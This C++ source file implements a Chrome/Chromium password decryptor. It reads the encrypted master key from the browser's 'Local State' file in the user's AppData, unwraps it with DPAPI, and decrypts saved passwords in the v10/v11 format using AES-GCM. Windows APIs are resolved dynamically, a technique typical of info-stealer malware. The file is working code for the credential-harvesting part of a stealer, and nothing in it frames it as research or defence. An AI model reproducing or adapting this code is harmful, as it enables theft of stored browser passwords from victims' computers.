#include "ChromeDecryptor.h"

#include <Base64.h>


ChromeDecryptor::ChromeDecryptor()
{
	if (!m_pbOutput)
		m_pbOutput = new char[MAX_SIZE_PASS];

	m_BCryptDecrypt = WinApiImport<f_BCryptDecrypt>::get("BCryptDecrypt", "bcrypt.dll");
	m_CryptUnprotectData = WinApiImport<f_CryptUnprotectData>::get("CryptUnprotectData", "crypt32.dll");
	m_BCryptOpenAlgorithmProvider = WinApiImport<f_BCryptOpenAlgorithmProvider>::get("BCryptOpenAlgorithmProvider", "bcrypt.dll");
	m_BCryptSetProperty = WinApiImport<f_BCryptSetProperty>::get("BCryptSetProperty", "bcrypt.dll");
	m_BCryptGenerateSymmetricKey = WinApiImport<f_BCryptGenerateSymmetricKey>::get("BCryptGenerateSymmetricKey", "bcrypt.dll");
}

ChromeDecryptor::~ChromeDecryptor()
{
	if (m_pbOutput)
		delete[] m_pbOutput;
	
}

bool ChromeDecryptor::init(const String& sPath)
{
	std::string keyBase64;
	DWORD keySize = 0;
	if (!get_chrome_key(keyBase64, keySize, sPath))
	{
		return false;
	}

	char decryptedKey[8192]; //ключ размером 32 байта (256 бит)

	if (!key_decrypt(keyBase64, keySize, decryptedKey))
	{
		return false;
	}

	const DWORD decKeySize = strlen(decryptedKey);

	init_for_chrome_80();
	init_key_for_chrome_80((PBYTE)decryptedKey, decKeySize);

	return true;
	
}

bool ChromeDecryptor::decrypt_data(const String& encrypted_data, String& decrypted_data)
{
	auto password = const_cast<char*>(encrypted_data.c_str());

	if (((char)password[0] == 'v' && (char)password[1] == '1' && (char)password[2] == '0') ||
		((char)password[0] == 'v' && (char)password[1] == '1' && (char)password[2] == '1'))
	{

		ULONG cbOutput = MAX_SIZE_PASS;
		ULONG cbCiphertext = 0;	


		BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO BACMI;
		BCRYPT_INIT_AUTH_MODE_INFO(BACMI); // Макрос инициализирует структуру BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO

		BACMI.pbNonce = (PUCHAR)(password + 3); // Пропускаем префикс "v10".
		BACMI.cbNonce = 12; // Размер Nonce = 12 байт.

		BACMI.pbTag = (PUCHAR)(password + m_password_size - 16);
		BACMI.cbTag = 16;


		NTSTATUS status = 0;		

		if (!BCRYPT_SUCCESS(status = m_BCryptDecrypt(m_hKey, (BYTE*)(password + 15), m_password_size - 15 - 16, &BACMI, NULL, 0, (PUCHAR)m_pbOutput, cbOutput, &cbCiphertext, 0)))
		{
			printf("Error: 0x%x\n", status);
		}

		m_pbOutput[cbCiphertext] = '\0';


		decrypted_data = m_pbOutput;

		return true;
	}	
	
	char decryptedPass[1024];
	
	if (!dpapi_decrypt(reinterpret_cast<BYTE*>(password), m_password_size, decryptedPass))
	{
		return false;
	}	
	
	decrypted_data = decryptedPass;
	return true;	
}

void ChromeDecryptor::set_password_size(int size)
{
	m_password_size = size;
}

bool ChromeDecryptor::get_chrome_key(std::string& key, unsigned long& keySize, const String& chromium_path)
{
	String chrome_path;

	if (!get_key_path(chrome_path, chromium_path))	return false;
	
	if(!IO::is_file_exists(chrome_path)) return false;
	
	String raw_json;
	if(!IO::read_file(chrome_path, raw_json)) return false;

	auto json_text = nlohmann::json::parse(raw_json);

	auto empty = json_text.empty();

	if (!json_text.contains("os_crypt")) return false;

	if (!json_text.at("os_crypt").contains("encrypted_key")) return false;

	key = json_text.at("os_crypt").at("encrypted_key").get<std::string>();
	keySize = key.length();

	return true;
}

bool ChromeDecryptor::get_key_path(String& keyPath, const String& chromium_path)
{	
	//получаем путь до AppData		
	int local_app_data = 0x001c;
	auto path = IO::get_app_folder(local_app_data);	
	if (path.empty()) return false;
	
	//файл Local State содержит зашифрованный ключ для AES256-GCM (base64+DPAPI)
	keyPath = path;
	keyPath += chromium_path + R"(\User Data\Local State)";

	return true;
}

bool ChromeDecryptor::key_decrypt(std::string keyBase64, DWORD keySize, char* decKey)
{
	char* keyEncDPAPI = NULL;
	DWORD keyEncDPAPISize = 0;
	BYTE* keyEnc = NULL;
	DWORD keyEncSize = 0;

	keyEncDPAPI = new char[keySize];

	//расшифровываем base64
	auto key_decoded = base64_decryptor::base64_decode(keyBase64);

	keyEncDPAPISize = key_decoded.length();

	keyEncDPAPI = (char*)key_decoded.c_str();


	keyEnc = new BYTE[keyEncDPAPISize - DPAPI_PREFIX_LEN];


	//убираем префикс "DPAPI"
	int counter = 0;
	for (int i = DPAPI_PREFIX_LEN; i < keyEncDPAPISize; i++)
	{
		keyEnc[counter++] = keyEncDPAPI[i];
	}

	if (dpapi_decrypt(keyEnc, (keyEncDPAPISize - DPAPI_PREFIX_LEN), (decKey)))
	{		
		delete[] keyEnc;
		return true;
	}

	return false;
}

bool ChromeDecryptor::dpapi_decrypt(unsigned char* encText, unsigned long encTextSize, char* decText)
{
	DATA_BLOB in;
	DATA_BLOB out;

	in.pbData = encText;
	in.cbData = encTextSize;	

	if (m_CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))
	{
		for (int i = 0; i < out.cbData; i++)
			decText[i] = out.pbData[i];
		decText[out.cbData] = '\0';

		return true;
	}

	return false;
}

bool ChromeDecryptor::init_for_chrome_80()
{
	bool bRet = false;
	do
	{			

		if (m_BCryptOpenAlgorithmProvider(&m_hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0)
		{
			printf("[DEBUG] Crypt::BCrypt::Init: can't initialize cryptoprovider. Last error code: %d \n",
			       GetLastError());
			break;
		}
					

		if (m_BCryptSetProperty(m_hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
		                        sizeof(BCRYPT_CHAIN_MODE_GCM),
		                        0) != 0)
		{
			printf("[DEBUG] Crypt::BCrypt::Init: can't set chaining mode. Last error code: %d \n", GetLastError());
			break;
		}		

		bRet = true;
	}
	while (false);

	return bRet;
}

bool ChromeDecryptor::init_key_for_chrome_80(PBYTE pbKey, ULONG sizeKey)
{
	bool bRet = true;

	if (m_BCryptGenerateSymmetricKey(m_hAlg, &m_hKey, NULL, 0, pbKey, sizeKey, 0) != 0)
	{
		printf("[DEBUG] Crypt::BCrypt::Init: can't deinitialize cryptoprovider. Last error code: %d \n",
		       GetLastError());
		bRet = false;
	}

	return bRet;
}
